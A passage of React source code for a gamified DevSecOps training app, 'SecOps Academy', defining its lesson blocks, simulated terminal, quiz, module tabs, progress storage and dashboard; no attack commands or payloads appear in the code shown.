            {f.type === 'summary' && <div className="mt-2 pt-2" style={{ borderTop: `1px solid ${DT.border}`, color: DT.textSecondary }}>{f.text}</div>}
          </div>
        ))}
      </div>
    </div>
  );
}

function SeverityBarsBlock({ title, items }) {
  const maxVal = Math.max(...items.map(i => i.count));
  return (
    <div className="rounded-xl p-5" style={{ background: DT.surface }}>
      {title && <div className="text-xs font-semibold uppercase tracking-wider mb-4" style={{ color: DT.textTertiary }}>{title}</div>}
      <div className="space-y-3">
        {items.map((item, i) => (
          <div key={i} className="flex items-center gap-3">
            <div className="w-8 text-right text-xs font-bold" style={{ color: item.color || DT.textSecondary }}>{item.rank || (i + 1)}</div>
            <div className="flex-1">
              <div className="flex items-center justify-between mb-1">
                <span className="text-sm" style={{ color: DT.textPrimary }}>{item.label}</span>
                <span className="text-xs font-medium" style={{ color: item.color || DT.textTertiary }}>{item.count}</span>
              </div>
              <div className="h-2 rounded-full overflow-hidden" style={{ background: DT.surfaceRaised }}>
                <div className="h-full rounded-full transition-all" style={{ width: `${(item.count / maxVal) * 100}%`, background: item.color || DT.blue }} />
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function AttackFlowBlock({ steps }) {
  return (
    <div className="rounded-xl p-5" style={{ background: DT.surface }}>
      <div className="space-y-0">
        {steps.map((step, i) => (
          <div key={i} className="flex gap-4 pb-4">
            <div className="flex flex-col items-center">
              <div className="w-10 h-10 rounded-full flex items-center justify-center text-sm shrink-0" style={{ background: step.type === 'attack' ? DT.errorMuted : step.type === 'defense' ? DT.successMuted : DT.blueMuted, color: step.type === 'attack' ? DT.error : step.type === 'defense' ? DT.success : DT.blue, border: `2px solid ${step.type === 'attack' ? DT.error : step.type === 'defense' ? DT.success : DT.blue}` }}>
                {step.type === 'attack' ? '⚠' : step.type === 'defense' ? '🛡' : (i + 1)}
              </div>
              {i < steps.length - 1 && <div className="w-0.5 flex-1 mt-1" style={{ background: step.type === 'attack' ? DT.error + '44' : step.type === 'defense' ? DT.success + '44' : DT.border }} />}
            </div>
            <div className="pt-1.5 flex-1">
              <div className="font-semibold text-sm" style={{ color: step.type === 'attack' ? DT.error : step.type === 'defense' ? DT.success : DT.textPrimary }}>{step.label}</div>
              <div className="text-sm mt-1 leading-relaxed" style={{ color: DT.textSecondary }}>{step.detail}</div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function DiagramBlock({ nodes }) {
  return (
    <div className="rounded-xl p-6 overflow-x-auto" style={{ background: DT.surface }}>
      <div className="flex items-start gap-1 min-w-max">
        {nodes.map((node, i) => (
          <React.Fragment key={i}>
            <div className="flex flex-col items-center w-24">
              <div className="w-14 h-14 rounded-xl flex items-center justify-center text-xs font-bold" style={{ background: DT.blueMuted, color: DT.blue, border: `1px solid ${DT.border}` }}>
                {node.label.slice(0, 3)}
              </div>
              <div className="text-xs font-semibold text-[#FAFAFA] mt-2 text-center">{node.label}</div>
              {node.note && <div className="text-[10px] text-[#71717A] mt-0.5 text-center leading-tight">{node.note}</div>}
            </div>
            {i < nodes.length - 1 && <ArrowRight size={14} className="mt-4 shrink-0" style={{ color: DT.borderSubtle }} />}
          </React.Fragment>
        ))}
      </div>
    </div>
  );
}

function StepsBlock({ steps }) {
  return (
    <div className="space-y-0">
      {steps.map((step, i) => (
        <div key={i} className="flex gap-4 relative pb-5">
          <div className="flex flex-col items-center">
            <div className="w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold shrink-0" style={{ background: DT.blueMuted, color: DT.blue, border: `1px solid ${DT.border}` }}>
              {i + 1}
            </div>
            {i < steps.length - 1 && <div className="w-0.5 flex-1 mt-1" style={{ background: DT.border }} />}
          </div>
          <div className="pt-1">
            <div className="text-[#FAFAFA] font-semibold text-sm">{step.label}</div>
            {step.detail && <div className="text-[#A1A1AA] text-sm mt-1 leading-relaxed">{step.detail}</div>}
          </div>
        </div>
      ))}
    </div>
  );
}

function KeytermsBlock({ terms }) {
  return (
    <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
      {terms.map((t, i) => (
        <div key={i} className="rounded-lg p-4" style={{ background: DT.surface }}>
          <div className="text-sm font-semibold mb-1" style={{ color: DT.blue }}>{t.term}</div>
          <div className="text-sm text-[#A1A1AA] leading-relaxed">{t.definition}</div>
        </div>
      ))}
    </div>
  );
}

function ContentBlock({ block }) {
  switch (block.type) {
    case 'text': return <TextBlock content={block.content} />;
    case 'callout': return <CalloutBlock variant={block.variant} title={block.title} content={block.content} />;
    case 'timeline': return <TimelineBlock items={block.items} />;
    case 'cost-chart': return <CostChartBlock items={block.items} />;
    case 'comparison': return <ComparisonBlock items={block.items} />;
    case 'diagram': return <DiagramBlock nodes={block.nodes} />;
    case 'steps': return <StepsBlock steps={block.steps} />;
    case 'keyterms': return <KeytermsBlock terms={block.terms} />;
    case 'pipeline': return <PipelineBlock stages={block.stages} />;
    case 'scan-output': return <ScanOutputBlock title={block.title} tool={block.tool} findings={block.findings} />;
    case 'severity-bars': return <SeverityBarsBlock title={block.title} items={block.items} />;
    case 'attack-flow': return <AttackFlowBlock steps={block.steps} />;
    default: return <TextBlock content={block.content || ''} />;
  }
}

// ============================================================================
// STORAGE HELPERS
// ============================================================================
const STORAGE_DEFAULTS = {
  'secops-profile': { callsign: '', totalXP: 0, streak: 0, longestStreak: 0, lastActiveDate: '', createdAt: '', leaderboardOptIn: false },
  'secops-progress': { modules: {} },
  'secops-terminal': { masteredCommands: [], challengesCompleted: [] },
  'secops-badges': Object.fromEntries(
    ['first-scan', 'secret-keeper', 'pipeline-builder', 'full-stack-scanner', 'quiz-master', 'terminal-warrior', 'vault-guardian', 'policy-enforcer', 'scenario-survivor', 'academy-graduate'].map(b => [b, { unlocked: false, unlockedAt: '' }])
  ),
  'secops-activity': { log: [] },
};

async function storageGet(key) {
  try {
    const val = await window.storage.getItem(key, { shared: false });
    return val ? (typeof val === 'string' ? JSON.parse(val) : val) : STORAGE_DEFAULTS[key] || null;
  } catch {
    return STORAGE_DEFAULTS[key] || null;
  }
}

async function storageSet(key, value, shared = false) {
  try {
    await window.storage.setItem(key, typeof value === 'string' ? value : JSON.stringify(value), { shared });
  } catch { /* silent */ }
}

// ============================================================================
// COMPONENTS: UTILITIES
// ============================================================================
function Toast({ message, onDone }) {
  useEffect(() => {
    const t = setTimeout(onDone, 3000);
    return () => clearTimeout(t);
  }, [onDone]);
  return (
    <div className="fixed top-4 right-4 z-50 px-4 py-3 rounded-xl text-sm font-medium shadow-lg" style={{ background: DT.surface, border: `1px solid ${DT.blue}`, color: DT.blue, boxShadow: '0 4px 12px rgba(0,0,0,0.4)' }}>
      {message}
    </div>
  );
}

function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = useCallback(() => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  }, [text]);
  return (
    <button onClick={handleCopy} className="inline-flex items-center gap-1 px-2 py-1 rounded text-xs border border-[#27272A] hover:border-[#3B82F6] text-[#71717A] hover:text-[#3B82F6] transition-colors" title="Copy">
      {copied ? <Check size={12} /> : <Copy size={12} />}
      {copied ? 'Copied' : 'Copy'}
    </button>
  );
}

function ProgressRing({ pct, size = 40, stroke = 3 }) {
  const r = (size - stroke) / 2;
  const circ = 2 * Math.PI * r;
  return (
    <svg width={size} height={size} className="transform -rotate-90">
      <circle cx={size / 2} cy={size / 2} r={r} fill="none" stroke="#27272A" strokeWidth={stroke} />
      <circle cx={size / 2} cy={size / 2} r={r} fill="none" stroke="#3B82F6" strokeWidth={stroke} strokeDasharray={circ} strokeDashoffset={circ * (1 - pct / 100)} strokeLinecap="round" />
    </svg>
  );
}

// ============================================================================
// COMPONENT: FILE BROWSER (for simulations)
// ============================================================================
function FileBrowser({ files, selectedFile, onSelectFile }) {
  const [expanded, setExpanded] = useState(() => {
    const init = {};
    Object.keys(files).forEach(k => { if (typeof files[k] === 'object') init[k] = true; });
    return init;
  });
  const toggle = (path) => setExpanded(p => ({ ...p, [path]: !p[path] }));

  const renderTree = (tree, prefix = '') => {
    return Object.entries(tree).map(([name, content]) => {
      const path = prefix + name;
      const isDir = typeof content === 'object' && content !== null && !Array.isArray(content);
      if (isDir) {
        return (
          <div key={path}>
            <button onClick={() => toggle(path)} className="flex items-center gap-1 w-full px-2 py-1 text-left text-[#FAFAFA] hover:bg-[#27272A] rounded text-xs font-mono">
              {expanded[path] ? <ChevronDown size={12} /> : <ChevronRight size={12} />}
              <Folder size={12} className="text-[#3B82F6]" />
              <span>{name}</span>
            </button>
            {expanded[path] && <div className="ml-3">{renderTree(content, path)}</div>}
          </div>
        );
      }
      return (
        <button key={path} onClick={() => onSelectFile({ name: path, content })} className={`flex items-center gap-1 w-full px-2 py-1 text-left rounded text-xs font-mono ${selectedFile?.name === path ? 'bg-[#27272A] text-[#3B82F6]' : 'text-[#71717A] hover:bg-[#27272A] hover:text-[#FAFAFA]'}`}>
          <File size={12} />
          <span>{name}</span>
        </button>
      );
    });
  };

  return (
    <div className="bg-[#09090B] border-r border-[#27272A] p-2 overflow-y-auto" style={{ minWidth: 180, maxWidth: 220 }}>
      <div className="text-[#3B82F6] text-xs font-bold mb-2 uppercase tracking-wider">Files</div>
      {renderTree(files)}
    </div>
  );
}

function highlightLine(line) {
  const tokens = [];
  let remaining = line;
  let key = 0;
  const push = (text, color, bg) => { if (text) tokens.push(<span key={key++} style={{ color, background: bg || 'transparent' }}>{text}</span>); };

  // Comment lines
  if (/^\s*(\/\/|#)/.test(remaining)) {
    push(remaining, '#71717A');
    return tokens;
  }

  const regex = /(["'])(?:(?!\1|\\).|\\.)*\1|(?:^|\s)(FROM|RUN|COPY|CMD|EXPOSE|WORKDIR|USER|HEALTHCHECK|import|const|let|var|function|if|else|return|def|class)(?=\s|$|\(|;)|\b\d+\.?\d*\b|(AKIA[A-Z0-9]{12,}|password|secret|token|key)\s*[=:]/gi;
  let lastIndex = 0;
  let match;
  while ((match = regex.exec(remaining)) !== null) {
    if (match.index > lastIndex) push(remaining.slice(lastIndex, match.index), '#FAFAFA');
    const m = match[0];
    if (/^["']/.test(m)) {
      push(m, '#CE9178');
    } else if (/^\s?(FROM|RUN|COPY|CMD|EXPOSE|WORKDIR|USER|HEALTHCHECK|import|const|let|var|function|if|else|return|def|class)$/i.test(m.trim())) {
      push(m, '#A78BFA');
    } else if (/^\d+\.?\d*$/.test(m)) {
      push(m, '#B5CEA8');
    } else if (/AKIA|password|secret|token|key/i.test(m)) {
      push(m, '#EF4444', 'rgba(239,68,68,0.1)');
    } else {
      push(m, '#FAFAFA');
    }
    lastIndex = match.index + m.length;
  }
  if (lastIndex < remaining.length) push(remaining.slice(lastIndex), '#FAFAFA');
  if (tokens.length === 0) push(remaining, '#FAFAFA');
  return tokens;
}

function FileViewer({ file }) {
  if (!file) return <div className="flex-1 flex items-center justify-center text-[#71717A] text-sm font-mono">Select a file to view</div>;
  const lines = file.content.split('\n');
  return (
    <div className="flex-1 overflow-auto bg-[#09090B] p-3">
      <div className="text-[#3B82F6] text-xs mb-2 font-mono">{file.name}</div>
      <pre className="text-xs font-mono leading-relaxed">
        {lines.map((line, i) => (
          <div key={i} className="flex">
            <span className="text-[#3a3a4e] select-none w-8 text-right mr-3 shrink-0">{i + 1}</span>
            <span>{highlightLine(line)}</span>
          </div>
        ))}
      </pre>
    </div>
  );
}

// ============================================================================
// COMPONENT: SIMULATED TERMINAL (for simulations)
// ============================================================================
function SimulatedTerminal({ steps, onComplete }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [input, setInput] = useState('');
  const [history, setHistory] = useState([]);
  const [showHint, setShowHint] = useState(false);
  const [awaitingAnswer, setAwaitingAnswer] = useState(false);
  const [followUpInput, setFollowUpInput] = useState('');
  const inputRef = useRef(null);
  const endRef = useRef(null);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [history]);
  useEffect(() => { if (!awaitingAnswer) inputRef.current?.focus(); }, [currentStep, awaitingAnswer]);

  const step = steps[currentStep];
  if (!step) return null;

  const handleCommand = () => {
    const trimmed = input.trim();
    if (!trimmed) return;
    const newHist = [...history, { type: 'input', text: trimmed }];
    const correct = trimmed.toLowerCase().replace(/\s+/g, ' ') === step.command.toLowerCase().replace(/\s+/g, ' ');
    if (correct) {
      newHist.push({ type: 'output', text: step.output });
      setHistory(newHist);
      setInput('');
      setShowHint(false);
      setAwaitingAnswer(true);
    } else {
      newHist.push({ type: 'error', text: `Command not recognized for this step. ${showHint ? `Hint: ${step.command}` : 'Use the Hint button if stuck.'}` });
      setHistory(newHist);
      setInput('');
    }
  };

  const handleFollowUp = () => {
    const trimmed = followUpInput.trim().toLowerCase();
    if (!trimmed) return;
    const ans = step.answer.toLowerCase();
    const isCorrect = trimmed === ans || ans.includes(trimmed) || trimmed.includes(ans);
    if (isCorrect) {
      setHistory(h => [...h, { type: 'followup-q', text: step.followUp }, { type: 'followup-a', text: `✅ Correct: ${followUpInput}` }]);
      setFollowUpInput('');
      setAwaitingAnswer(false);
      if (currentStep + 1 >= steps.length) {
        setHistory(h => [...h, { type: 'success', text: '🎉 Simulation complete! All steps finished.' }]);
        onComplete?.();
      } else {
        setCurrentStep(s => s + 1);
      }
    } else {
      setHistory(h => [...h, { type: 'followup-q', text: step.followUp }, { type: 'error', text: `❌ Not quite. Hint: ${step.hint}` }]);
      setFollowUpInput('');
    }
  };

  return (
    <div className="flex flex-col h-full">
      <div className="bg-[#18181B] border-b border-[#27272A] px-4 py-2 flex items-center justify-between">
        <div className="text-[#3B82F6] text-xs font-mono">Step {currentStep + 1}/{steps.length}: {step.objective}</div>
        <button onClick={() => setShowHint(true)} className="text-xs px-2 py-1 rounded border border-[#27272A] text-[#F59E0B] hover:border-[#F59E0B] font-mono">
          {showHint ? step.command : 'Hint'}
        </button>
      </div>
      <div className="flex-1 bg-[#0C0C0C] p-3 overflow-y-auto text-sm font-mono">
        {history.map((entry, i) => (
          <div key={i} className={`mb-1 ${entry.type === 'input' ? 'text-[#4ADE80]' : entry.type === 'error' ? 'text-[#EF4444]' : entry.type === 'success' ? 'text-[#22C55E] font-bold' : entry.type === 'followup-q' ? 'text-[#3B82F6]' : entry.type === 'followup-a' ? 'text-[#22C55E]' : 'text-[#D4D4D8]'}`}>
            {entry.type === 'input' && <span className="text-[#3B82F6]">secops&gt; </span>}
            <span className="whitespace-pre-wrap">{entry.text}</span>
          </div>
        ))}
        {awaitingAnswer ? (
          <div className="mt-2">
            <div className="text-[#3B82F6] mb-1">{step.followUp}</div>
            <div className="flex items-center gap-2">
              <span className="text-[#F59E0B]">answer&gt;</span>
              <input
                value={followUpInput}
                onChange={e => setFollowUpInput(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handleFollowUp()}
                className="flex-1 bg-transparent text-[#4ADE80] outline-none text-sm font-mono"
                autoFocus
              />
            </div>
          </div>
        ) : (
          <div className="flex items-center">
            <span className="text-[#3B82F6]">secops&gt; </span>
            <input
              ref={inputRef}
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={e => {
                if (e.key === 'Enter') handleCommand();
                if (e.key === 'Tab') {
                  e.preventDefault();
                  const curr = input.trim().toLowerCase();
                  if (curr && step) {
                    const cmd = step.command;
                    if (cmd.toLowerCase().startsWith(curr)) {
                      setInput(cmd);
                    }
                  }
                }
              }}
              className="flex-1 bg-transparent text-[#4ADE80] outline-none text-sm font-mono"
            />
          </div>
        )}
        <div ref={endRef} />
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT: QUIZ
// ============================================================================
function Quiz({ questions, bestScore, onSubmit }) {
  const [answers, setAnswers] = useState(Array(questions.length).fill(-1));
  const [submitted, setSubmitted] = useState(false);
  const [score, setScore] = useState(0);

  const handleSubmit = () => {
    const s = answers.reduce((acc, a, i) => acc + (a === questions[i].answer ? 1 : 0), 0);
    setScore(s);
    setSubmitted(true);
    onSubmit?.(s);
  };

  const handleRetake = () => {
    setAnswers(Array(questions.length).fill(-1));
    setSubmitted(false);
    setScore(0);
  };

  return (
    <div className="space-y-6">
      {questions.map((q, qi) => (
        <div key={qi} className={`p-4 rounded-lg border ${submitted ? (answers[qi] === q.answer ? 'border-[#22C55E] bg-[rgba(34,197,94,0.05)]' : 'border-[#EF4444] bg-[rgba(239,68,68,0.05)]') : 'border-[#27272A] bg-[#18181B]'}`}>
          <div className="text-[#FAFAFA] text-sm mb-3">{qi + 1}. {q.q}</div>
          <div className="space-y-2">
            {q.opts.map((opt, oi) => (
              <label key={oi} className={`flex items-center gap-2 px-3 py-2 rounded cursor-pointer text-xs ${submitted ? (oi === q.answer ? 'bg-[rgba(59,130,246,0.1)] text-[#3B82F6]' : answers[qi] === oi ? 'bg-[rgba(239,68,68,0.1)] text-[#EF4444]' : 'text-[#71717A]') : answers[qi] === oi ? 'bg-[#27272A] text-[#3B82F6]' : 'text-[#71717A] hover:bg-[#27272A]'}`}>
                <input
                  type="radio"
                  name={`q-${qi}`}
                  checked={answers[qi] === oi}
                  onChange={() => !submitted && setAnswers(a => { const n = [...a]; n[qi] = oi; return n; })}
                  disabled={submitted}
                  className="accent-[#3B82F6]"
                />
                {opt}
                {submitted && oi === q.answer && <CheckCircle size={14} className="ml-auto text-[#3B82F6]" />}
                {submitted && answers[qi] === oi && oi !== q.answer && <XCircle size={14} className="ml-auto text-[#EF4444]" />}
              </label>
            ))}
          </div>
          {submitted && <div className="mt-2 text-xs text-[#71717A] font-mono border-t border-[#27272A] pt-2">{q.explanation}</div>}
        </div>
      ))}
      <div className="flex items-center gap-4">
        {!submitted ? (
          <button onClick={handleSubmit} disabled={answers.includes(-1)} className="px-4 py-2 rounded border border-[#3B82F6] text-[#3B82F6] text-sm hover:bg-[rgba(59,130,246,0.1)] disabled:opacity-30 disabled:cursor-not-allowed">Submit Quiz</button>
        ) : (
          <>
            <div className={`text-lg ${score >= 3 ? 'text-[#3B82F6]' : 'text-[#EF4444]'}`}>{score}/{questions.length} {score >= 3 ? '— Passed!' : '— Need 3/5 to pass'}</div>
            {score < 5 && <button onClick={handleRetake} className="px-4 py-2 rounded border border-[#3B82F6] text-[#3B82F6] text-sm hover:bg-[rgba(167,139,250,0.1)]">Retake</button>}
            {score === 5 && <div className="text-[#F59E0B] text-sm">Perfect score! +50 bonus XP</div>}
            {bestScore > 0 && <div className="text-[#71717A] text-xs">Best: {bestScore}/5</div>}
          </>
        )}
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT: MODULE VIEW (5-tab flow)
// ============================================================================
function ModuleView({ moduleId, progress, onUpdateProgress, onBack }) {
  const mod = MODULES[moduleId];
  if (!mod) return null;
  const tabs = ['learn'];
  if (mod.hasSim) tabs.push('simulate');
  if (mod.hasExecute) tabs.push('execute');
  if (mod.hasVerify) tabs.push('verify');
  if (mod.quiz) tabs.push('quiz');
  const [activeTab, setActiveTab] = useState('learn');
  const [selectedFile, setSelectedFile] = useState(null);
  const [verifyAnswers, setVerifyAnswers] = useState({});
  const [verifySubmitted, setVerifySubmitted] = useState(false);
  const [notesOpen, setNotesOpen] = useState(false);
  const mp = progress?.modules?.[moduleId] || {};
  const [notes, setNotes] = useState(mp.notes || '');

  const tabLabels = { learn: 'Learn', simulate: 'Simulate', execute: 'Execute', verify: 'Verify', quiz: 'Quiz' };
  const tabIcons = { learn: BookOpen, simulate: Terminal, execute: Play, verify: CheckCircle, quiz: Brain };

  const handleSimComplete = () => {
    onUpdateProgress(moduleId, { simulationComplete: true, completedAt: new Date().toISOString() });
  };

  const handleVerifySubmit = () => {
    setVerifySubmitted(true);
    onUpdateProgress(moduleId, { verified: true });
  };

  const handleQuizSubmit = (score) => {
    const best = Math.max(score, mp.quizBestScore || 0);
    onUpdateProgress(moduleId, { quizBestScore: best, quizAttempts: (mp.quizAttempts || 0) + 1 });
  };

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center gap-3 px-6 py-4 border-b" style={{ borderColor: DT.border, background: DT.surface }}>
        <button onClick={onBack} className="hover:opacity-80 transition-opacity" style={{ color: DT.textTertiary }}><ChevronRight size={16} className="transform rotate-180" /></button>
        <div>
          <div className="text-sm font-semibold" style={{ color: DT.textPrimary }}>{mod.id}: {mod.title}</div>
          <div className="text-xs mt-0.5 flex items-center gap-2" style={{ color: DT.textTertiary }}><span>{mod.baseXP} XP</span>{mod.estTime && <span className="flex items-center gap-1"><Clock size={10} /> {mod.estTime}</span>}</div>
        </div>
        <div className="ml-auto flex gap-2">
          {mp.simulationComplete && <span className="text-xs px-2 py-0.5 rounded-md font-medium" style={{ background: DT.successMuted, color: DT.success }}>Sim ✓</span>}
          {mp.verified && <span className="text-xs px-2 py-0.5 rounded-md font-medium" style={{ background: DT.blueMuted, color: DT.blue }}>Verified ✓</span>}
          {(mp.quizBestScore || 0) >= 3 && <span className="text-xs px-2 py-0.5 rounded-md font-medium" style={{ background: DT.amberMuted, color: DT.amber }}>Quiz {mp.quizBestScore}/5</span>}
        </div>
      </div>
      <div className="flex border-b px-2" style={{ borderColor: DT.border, background: DT.bg }}>
        {tabs.map(t => {
          const Icon = tabIcons[t];
          return (
            <button key={t} onClick={() => setActiveTab(t)} className={`flex items-center gap-2 px-4 py-2.5 text-[13px] font-medium border-b-2 transition-colors`} style={activeTab === t ? { borderColor: DT.blue, color: DT.blue } : { borderColor: 'transparent', color: DT.textTertiary }}>
              <Icon size={14} /> {tabLabels[t]}
            </button>
          );
        })}
      </div>
      <div className="flex-1 overflow-y-auto p-8">
        {activeTab === 'learn' && (
          <div className="max-w-4xl mx-auto space-y-10">
            {mod.theory.sections.map((s, i) => (
              <div key={i}>
                <div className="flex items-baseline gap-3 mb-4 border-b pb-3" style={{ borderColor: DT.border }}>
                  <span className="text-xs font-semibold" style={{ color: DT.textTertiary }}>{String(i + 1).padStart(2, '0')}</span>
                  <h3 className="text-base font-semibold" style={{ color: DT.textPrimary, letterSpacing: '-0.01em' }}>{s.heading}</h3>
                </div>
                {s.blocks ? (
                  <div className="space-y-5">
                    {s.blocks.map((block, j) => <ContentBlock key={j} block={block} />)}
                  </div>
                ) : (
                  <div className={`${s.highlight ? 'rounded-xl p-5' : ''}`} style={s.highlight ? { background: DT.blueMuted, borderLeft: `3px solid ${DT.blue}` } : s.breach ? { background: DT.errorMuted, borderLeft: `3px solid ${DT.error}`, borderRadius: 12, padding: 20 } : s.callout ? { background: DT.amberMuted, borderLeft: `3px solid ${DT.amber}`, borderRadius: 12, padding: 20 } : {}}>
                    <p className="text-[15px] leading-[1.7]" style={{ color: s.highlight || s.breach || s.callout ? DT.textPrimary : DT.textSecondary }}>{s.content}</p>
                  </div>
                )}
              </div>
            ))}
            <div className="mt-8 border rounded-lg overflow-hidden" style={{ borderColor: DT.border }}>
              <button onClick={() => setNotesOpen(!notesOpen)} className="w-full flex items-center gap-2 px-4 py-3 text-left text-sm font-medium" style={{ background: DT.surface, color: DT.textSecondary }}>
                <StickyNote size={14} style={{ color: DT.amber }} />
                Notes {notes ? '(has notes)' : ''}
                {notesOpen ? <ChevronDown size={14} className="ml-auto" /> : <ChevronRight size={14} className="ml-auto" />}
              </button>
              {notesOpen && (
                <div className="p-4" style={{ background: DT.bg }}>
                  <textarea
                    value={notes}
                    onChange={e => setNotes(e.target.value)}
                    onBlur={() => onUpdateProgress(moduleId, { notes })}
                    placeholder="Add your notes for this module..."
                    className="w-full h-32 rounded-lg p-3 text-sm resize-y outline-none"
                    style={{ background: DT.surface, border: `1px solid ${DT.border}`, color: DT.textPrimary }}
                  />
                </div>
              )}
            </div>
          </div>
        )}
        {activeTab === 'simulate' && mod.simulation && (
          <div className="flex flex-col" style={{ height: 'calc(100vh - 200px)' }}>
            <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-3 mb-3">
              <div className="text-[#F59E0B] text-xs uppercase tracking-wider mb-1">Scenario</div>
              <div className="text-[#FAFAFA] text-sm">{mod.simulation.scenario}</div>
            </div>
            <div className="flex flex-col md:flex-row flex-1 border border-[#27272A] rounded-lg overflow-hidden" style={{ minHeight: 400 }}>
              {mod.simulation.files && (
                <>
                  <FileBrowser files={mod.simulation.files} selectedFile={selectedFile} onSelectFile={setSelectedFile} />
                  <FileViewer file={selectedFile} />
                  <div className="hidden md:block w-px bg-[#27272A]" />
                  <div className="md:hidden h-px bg-[#27272A]" />
                </>
              )}
              <div className="flex-1">
                <SimulatedTerminal steps={mod.simulation.steps} onComplete={handleSimComplete} />
              </div>
            </div>
            {mp.simulationComplete && <div className="mt-3 text-[#3B82F6] text-sm">✅ Simulation complete — {mod.baseXP} XP earned!</div>}
          </div>
        )}
        {activeTab === 'execute' && mod.execute && (
          <div className="max-w-4xl space-y-4">
            <div className="text-[#FAFAFA] text-sm mb-4">{mod.execute.intro}</div>
            <div className="bg-[#18181B] border border-[#27272A] rounded-lg divide-y divide-[#27272A]">
              {mod.execute.commands.map((c, i) => (
                <div key={i} className="px-4 py-3">
                  <div className="text-[#71717A] text-xs mb-1">{c.desc}</div>
                  <div className="flex items-center gap-2">
                    <code className="text-[#3B82F6] text-sm flex-1">{c.cmd}</code>
                    <CopyButton text={c.cmd} />
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
        {activeTab === 'verify' && mod.verify && (
          <div className="max-w-4xl space-y-4">
            <div className="text-[#FAFAFA] text-sm mb-2">Answer these questions from your real tool output to verify you ran the commands.</div>
            <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-4 space-y-4">
              {mod.verify.map((q, i) => (
                <div key={i}>
                  <label className="text-[#3B82F6] text-sm block mb-1">{q}</label>
                  <input
                    value={verifyAnswers[i] || ''}
                    onChange={e => setVerifyAnswers(a => ({ ...a, [i]: e.target.value }))}
                    disabled={verifySubmitted}
                    className="w-full bg-[#09090B] border border-[#27272A] rounded px-3 py-2 text-[#FAFAFA] text-sm focus:border-[#3B82F6] outline-none"
                    placeholder="Your answer..."
                  />
                </div>
              ))}
              {!verifySubmitted ? (
                <button onClick={handleVerifySubmit} disabled={Object.keys(verifyAnswers).length < mod.verify.length || Object.values(verifyAnswers).some(v => !v.trim())} className="px-4 py-2 rounded border border-[#3B82F6] text-[#3B82F6] text-sm hover:bg-[rgba(167,139,250,0.1)] disabled:opacity-30 disabled:cursor-not-allowed">Submit Verification</button>
              ) : (
                <div className="text-[#3B82F6] text-sm">✅ Self-verified! +{Math.round(mod.baseXP * 0.3)} bonus XP earned. Be honest — the only person you're cheating is yourself.</div>
              )}
            </div>
          </div>
        )}
        {activeTab === 'quiz' && mod.quiz && (
          <div className="max-w-4xl">
            <Quiz questions={mod.quiz} bestScore={mp.quizBestScore || 0} onSubmit={handleQuizSubmit} />
          </div>
        )}
      </div>
    </div>
  );
}

// ============================================================================
// SCREEN: DASHBOARD
// ============================================================================
function DashboardScreen({ profile, progress, badges, terminal, onNavigate, onOpenModule }) {
  const rank = getRank(profile.totalXP);
  const nextRank = getNextRank(profile.totalXP);
  const totalMods = Object.keys(MODULES).length;
  const completedMods = Object.values(progress.modules || {}).filter(m => m.simulationComplete || m.quizBestScore >= 3).length;
  const verifiedLabs = Object.values(progress.modules || {}).filter(m => m.verified).length;
  const streakEmoji = profile.streak >= 7 ? '🔥🔥🔥' : profile.streak >= 3 ? '🔥🔥' : profile.streak >= 1 ? '🔥' : '';

  const findNext = () => {
    for (const pid of [1, 2, 3, 4, 5]) {
      const pathMods = Object.keys(MODULES).filter(k => MODULES[k].pathId === pid);
      for (const mid of pathMods) {
        const mp = progress.modules?.[mid];
        if (!mp?.simulationComplete && !(!MODULES[mid].hasSim && mp?.quizBestScore >= 3)) return mid;
      }
    }
    return null;
  };
  const nextMod = findNext();

  return (
    <div className="p-6 space-y-6 max-w-full">
      <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-6" style={{ boxShadow: '0 1px 3px rgba(0,0,0,0.3)' }}>
        <div className="text-[#3B82F6] text-lg font-bold">
          {profile.callsign ? `Welcome back, ${profile.callsign}` : 'Welcome to SecOps Academy'}
        </div>
        <div className="text-[#71717A] text-sm mt-1">
          {profile.callsign ? `${rank.icon} ${rank.name} — ${rank.tagline}` : 'Master DevSecOps from zero to production-ready'}
        </div>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        {[
          { label: 'Modules', value: `${completedMods}/${totalMods}`, sub: 'completed', pct: (completedMods / totalMods) * 100 },
          { label: 'Labs Verified', value: `${verifiedLabs}/${LABS_LIST.length}`, sub: 'real execution', pct: (verifiedLabs / LABS_LIST.length) * 100 },
          { label: 'Total XP', value: profile.totalXP.toLocaleString(), sub: `${rank.icon} ${rank.name}`, pct: nextRank ? ((profile.totalXP - rank.minXP) / (nextRank.minXP - rank.minXP)) * 100 : 100 },
          { label: 'Streak', value: `${profile.streak} days ${streakEmoji}`, sub: `Best: ${profile.longestStreak}`, pct: Math.min(profile.streak * 14, 100) },
        ].map((stat, i) => (
          <div key={i} className="bg-[#18181B] border border-[#27272A] rounded-lg p-4">
            <div className="text-[#71717A] text-xs uppercase tracking-wider">{stat.label}</div>
            <div className="text-[#3B82F6] text-xl font-bold mt-1">{stat.value}</div>
            <div className="text-[#71717A] text-xs mt-1">{stat.sub}</div>
            <div className="w-full h-1 bg-[#27272A] rounded mt-2">
              <div className="h-full bg-gradient-to-r from-[#3B82F6] to-[#A78BFA] rounded transition-all" style={{ width: `${Math.min(stat.pct, 100)}%` }} />
            </div>
          </div>
        ))}
      </div>

      <div>
        <div className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-3">Learning Paths</div>
        <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
          {PATHS.map(p => {
            const pathMods = Object.keys(MODULES).filter(k => MODULES[k].pathId === p.id);
